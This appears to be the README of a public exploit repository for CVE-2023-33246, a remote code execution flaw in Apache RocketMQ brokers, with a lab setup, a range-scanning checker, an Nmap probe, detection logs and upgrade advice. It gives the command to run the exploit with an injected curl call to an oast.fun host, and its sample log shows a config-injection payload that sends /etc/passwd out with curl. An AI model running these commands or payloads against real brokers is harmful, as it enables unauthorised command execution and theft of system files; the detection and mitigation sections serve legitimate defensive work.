<p align="center"><img src="https://rocketmq.apache.org/img/Apache_RocketMQ_logo.svg.png" /></p>




# CVE-2023-33246 RocketMQ Remote Code Execution Exploit
CVE-2023-33246 RocketMQ Remote Code Execution Exploit

# Overview
RocketMQ is a distributed messaging and streaming platform.

RocketMQ versions 5.1.0 and below are vulnerable to Arbitrary Code Injection. Broker component of RocketMQ is leaked on the extranet and lack permission verification. An attacker can exploit this vulnerability by using the update configuration function to execute commands as the system users that RocketMQ is running as. Additionally, an attacker can achieve the same effect by forging the RocketMQ protocol content.

# Setup local RocketMQ environment via Docker

```
docker pull apache/rocketmq:4.9.4
# Start nameserver
docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.4 sh mqnamesrv
# Start Broker
docker run -d --name rmqbroker --link rmqnamesrv:namesrv -e "NAMESRV_ADDR=namesrv:9876" -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.4 sh mqbroker -c /home/rocketmq/rocketmq-4.9.4/conf/broker.conf

```
# Detect RocketMQ version to identify vulnerabilities
```
usage: check.py [-h] [--ip IP] [--file FILE] [--port PORT] [--cidr CIDR]

Check CVE-2023-33246 RocketMQ RCE vulnerability

optional arguments:
  -h, --help   show this help message and exit
  --ip IP      A single IP address to check
  --file FILE  A file containing a list of IP addresses, one per line
  --port PORT  The port number to use when connecting to the server (default
               is 9876)
  --cidr CIDR  A CIDR range to scan (e.g. 1.2.3.0/24)
```
------
## usage examples
```
python3 check.py --ip 127.0.0.1 --port 9876
python3 check.py --cidr 192.168.1.0/24
# or 
python3 check.py --file rocketmq_targets.txt --port 9876
# target in file format:
# ip
# ip:port
# http://ip:port
```

# Run exploit
**⚠️ Caution: Please exercise caution when executing this script in your production environment, as the payload included has the capability to modify the configuration of RocketMQ.**
```
python3 CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py 127.0.0.1 10911 curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test
```

# Nmap Service Probe
Please append the following content to the nmap-service-probes file located in the Nmap installation directory.
```
##############################NEXT PROBE##############################
Probe TCP RocketMQ q|\x00\x00\x00\x64\x00\x00\x00\x60\x7b\x22\x63\x6f\x64\x65\x22\x3a\x32\x38\x2c\x22\x66\x6c\x61\x67\x22\x3a\x30\x2c\x22\x6c\x61\x6e\x67\x75\x61\x67\x65\x22\x3a\x22\x4a\x41\x56\x41\x22\x2c\x22\x6f\x70\x61\x71\x75\x65\x22\x3a\x30\x2c\x22\x73\x65\x72\x69\x61\x6c\x69\x7a\x65\x54\x79\x70\x65\x43\x75\x72\x72\x65\x6e\x74\x52\x50\x43\x22\x3a\x22\x4a\x53\x4f\x4e\x22\x2c\x22\x76\x65\x72\x73\x69\x6f\x6e\x22\x3a\x34\x33\x33\x7d|
ports 10911,11911,12911,13911
rarity 8

match RocketMQBroker m|"brokerVersionDesc":\s*"([^"]*)"| p/RocketMQ Broker/ v/$1/ cpe:/a:apache:rocketmq/
```
![alt text](https://github.com/malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT/blob/main/nmap-rocketmq-broker-detection.png?raw=true)


# Detection Procedure
In the event that your RocketMQ Broker has been compromised, you may identify this situation by observing certain patterns in the broker log, the broker logs will be look like:
```
2023-06-03 13:51:37 INFO AdminBrokerThread_5 - updateBrokerConfig called by 172.17.0.1:56412
2023-06-03 13:51:37 INFO AdminBrokerThread_5 - updateBrokerConfig, new config: [{filterServerNums=1, rocketmqHome=-c $@|sh . echo curl chxd6qa2vtc00007dfn0ge6sumayyyyyb.oast.fun --data @/etc/passwd;}] client: /172.17.0.1:56412 
2023-06-03 13:51:37 INFO AdminBrokerThread_5 - Replace, key: filterServerNums, value: 0 -> 1
2023-06-03 13:51:37 INFO AdminBrokerThread_5 - Replace, key: rocketmqHome, value: /home/rocketmq/rocketmq-4.9.4 -> -c $@|sh . echo curl chxd6qa2vtc00007dfn0ge6sumayyyyyb.oast.fun --data @/etc/passwd;
```


# Mitigation
Upgrade org.apache.rocketmq:rocketmq-broker to version 4.9.6, 5.1.1 or higher.

# References
 - [Apache Lists](https://lists.apache.org/thread/1s8j2c8kogthtpv3060yddk03zq0pxyp)
 - [GitHub Commit](https://github.com/apache/rocketmq/commit/9d411cf04a695e7a3f41036e8377b0aa544d754d)
 - [GitHub Commit](https://github.com/apache/rocketmq/commit/c3ada731405c5990c36bf58d50b3e61965300703)
 - [GitHub Release](https://github.com/apache/rocketmq/releases/tag/rocketmq-all-4.9.6)
